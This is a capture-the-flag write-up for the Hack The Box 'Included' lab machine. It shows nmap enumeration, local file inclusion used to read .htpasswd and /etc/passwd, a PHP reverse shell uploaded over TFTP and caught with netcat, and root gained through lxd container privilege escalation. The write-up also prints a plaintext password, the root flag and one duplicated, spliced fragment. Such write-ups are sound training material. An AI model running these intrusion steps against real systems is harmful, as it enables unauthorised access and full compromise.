# Included

URL: https://app.hackthebox.com/starting-point

Level: Very Easy

Start time: 21 Feb 2022, 4:36pm GMT+1

End time: 22 Feb 2022, 6:16am GMT+1


## Walkthrough

### Enumeration

#### NMAP

Basic nmap scan:

```
# Nmap 7.92 scan initiated Mon Feb 21 16:35:57 2022 as: nmap -T4 -p- -oN 01_nmap 10.129.95.185
Nmap scan report for 10.129.95.185
Host is up (0.054s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

# Nmap done at Mon Feb 21 16:36:13 2022 -- 1 IP address (1 host up) scanned in 16.15 seconds
```

Again, with -sC -sV:

```
# Nmap 7.92 scan initiated Mon Feb 21 17:03:08 2022 as: nmap -T4 -p80 -sC -sV -oN 02_nmap 10.129.95.185
Nmap scan report for 10.129.95.185
Host is up (0.053s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.129.95.185/?file=home.php

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 21 17:03:20 2022 -- 1 IP address (1 host up) scanned in 12.40 seconds
```

UDP scan:

```
# Nmap 7.92 scan initiated Mon Feb 21 17:22:09 2022 as: nmap -sU -T4 -oN 03_nmap_top1000_udp 10.129.95.185
Warning: 10.129.95.185 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.95.185
Host is up (0.050s latency).
Not shown: 991 closed udp ports (port-unreach)
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
689/udp   open|filtered nmap
17282/udp open|filtered unknown
17845/udp open|filtered unknown
30697/udp open|filtered unknown
32818/udp open|filtered unknown
49176/udp open|filtered unknown
53037/udp open|filtered unknown

# Nmap done at Mon Feb 21 17:40:12 2022 -- 1 IP address (1 host up) scanned in 1082.86 seconds
```

So far we have a web server and a TFTP server.

On port 80/TCP we get a simple web page vulnerable to LFI (Local File Inclusion).

We grab `.htpasswd`:

```
mike:Sheffield19
```

and of course `/etc/passwd```
mike:Sheffield19
```

and of course `/etc/passwd`

```
# curl -L http://10.129.88.142/index.php?file=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
mike:x:1000:1000:mike:/home/mike:/bin/bash
tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
```

(from this we can path for TFTP uploads).

We put a reverse PHP shell through TFTP:

```
root@kaligra:/opt/htb-startingpoint/Included# tftp 10.129.88.142
tftp> put php-reverse-shell.php
Sent 5685 bytes in 0.7 seconds
tftp> bye
```

Spawn a netcat listener:

```
root@kaligra:/opt/htb-startingpoint/Included# nc -nlvp 4444
listening on [any] 4444 ...
```

```
# curl -L http://10.129.88.142/index.php?file=/var/lib/tftpboot/php-reverse-shell.php
```

### Foothold

```
connect to [10.10.16.44] from (UNKNOWN) [10.129.88.142] 53288
Linux included 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 17:20:13 up 20 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ su - mike
su: must be run from a terminal
$ python3 -c 'import pty; pty.spawn("/bin/bash");'
www-data@included:/$ su - mike
su - mike
Password: Sheffield19

mike@included:~$
```

We notice that `mike` is member of `lxc` group.

Then, we try local privesc through Linux Container.

rif. https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

```
apt update
apt install -y golang-go debootstrap rsync gpg squashfs-tools
git clone https://github.com/lxc/distrobuilder
cd distrobuilder/
make
```

Build `alpine` container:

```
mkdir -p $HOME/ContainerImages/alpine
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
distrobuilder build-lxd alpine.yaml -o image.release=3.8
```

We upload stuff on remote target:

```
root@kaligra:~/ContainerImages/alpine# python3 -m http.server 8000

mike@included:~$ wget http://10.10.16.44:8000/lxd.tar.xz

mike@included:~$ wget http://10.10.16.44:8000/rootfs.squashfs
```

We import image:

```
mike@included:~$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
```

We create image:

```
mike@included:~$ lxc image list
lxc image list
+--------+--------------+--------+----------------------------------------+--------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |              DESCRIPTION               |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+----------------------------------------+--------+--------+------------------------------+
| alpine | 575a8c878248 | no     | Alpinelinux 3.8 x86_64 (20220222_1646) | x86_64 | 1.96MB | Feb 22, 2022 at 5:24pm (UTC) |
+--------+--------------+--------+----------------------------------------+--------+--------+------------------------------+
mike@included:~$ lxc init alpine privesc -c security.privileged=true
lxc init alpine privesc -c security.privileged=true
Creating privesc
```

We add root path.

```
mike@included:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
<st-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc
```

We launch container:

```
mike@included:~$ lxc start privesc
lxc start privesc
mike@included:~$
```

### Root flag

```
mike@included:~$ lxc exec privesc /bin/sh
lxc exec privesc /bin/sh
~ # ^[[46;5R

~ # ^[[46;5R

~ # ^[[46;5R

~ # ^[[46;5Rid
id
uid=0(root) gid=0(root)
~ # ^[[46;5R
```

```
~ # ^[[46;5Rcd /mnt/root
cd /mnt/root
/mnt/root # ^[[46;13Rls
ls
bin             initrd.img.old  proc            tmp
boot            lib             root            usr
cdrom           lib64           run             var
dev             lost+found      sbin            vmlinuz
etc             media           snap            vmlinuz.old
home            mnt             srv
initrd.img      opt             sys
/mnt/root # ^[[46;13Rcd root
cd root
/mnt/root/root # ^[[46;18Rls
ls
root.txt
/mnt/root/root # ^[[46;18Rcat root.txt
cat root.txt
c693d9c7499d9f572ee375d4c14c7bcf
```
